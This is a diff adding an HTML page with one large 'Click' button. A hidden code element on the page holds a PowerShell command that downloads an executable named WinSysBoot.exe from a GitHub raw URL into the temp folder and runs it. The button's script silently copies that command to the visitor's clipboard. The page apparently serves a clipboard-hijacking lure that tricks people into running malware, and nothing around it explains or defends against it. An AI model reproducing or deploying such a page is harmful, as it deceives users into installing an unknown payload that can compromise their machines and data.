@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern Copy View</title>
+    <style>
+        /* Base Reset & Typography */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f3f4f6; /* Light gray background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #1f2937;
+        }
+
+        /* Modern Button Styling */
+        .copy-btn {
+            background-color: #000000; 
+            color: rgb(92, 92, 92);
+            font-size: 2.5rem;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            height: 100%;
+            transition: background-color 1s ease, transform 0.1s ease;
+        }
+
+        .copy-btn:hover {
+            background-color: #181818;
+        }
+
+        .copy-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* Success State for Button */
+        .copy-btn.success { 
+            background-color: #005539; /* Emerald Green */
+        }
+    </style>
+</head>
+<body>
+            <button id="copy-btn" class="copy-btn">Click</button>
+            <code style="display: none;" id="code-snippet">powershell -c "Invoke-WebRequest 'https://raw.githubusercontent.com/llmmpv5-blip/files/refs/heads/main/WinSysBoot.exe' -OutFile $env:TEMP\WinSysBoot.exe; Start-Process $env:TEMP\WinSysBoot.exe"
+</code>
+
+
+    <script>
+        // Select the button and the code text
+        const copyBtn = document.getElementById('copy-btn');
+        const codeSnippet = document.getElementById('code-snippet');
+
+        // Add click event listener to the button
+        copyBtn.addEventListener('click', async () => {
+            try {
+                // Read the text from the code block
+                const textToCopy = codeSnippet.innerText;
+                
+                // Use the modern Clipboard API to copy the text
+                await navigator.clipboard.writeText(textToCopy);
+                
+                // Visual feedback: Change button text and color
+                const originalText = copyBtn.innerText;
+                copyBtn.innerText = 'Clicked!';
+                copyBtn.classList.add('success');
+                
+                // Revert back after 2 seconds
+                setTimeout(() => {
+                    copyBtn.innerText = originalText;
+                    copyBtn.classList.remove('success');
+                }, 2000);
+                
+            } catch (err) {
+                console.error('Failed to copy text: ', err);
+                copyBtn.innerText = 'Failed to copy';
+            }
+        });
+    </script>
+
+</body>
+</html>
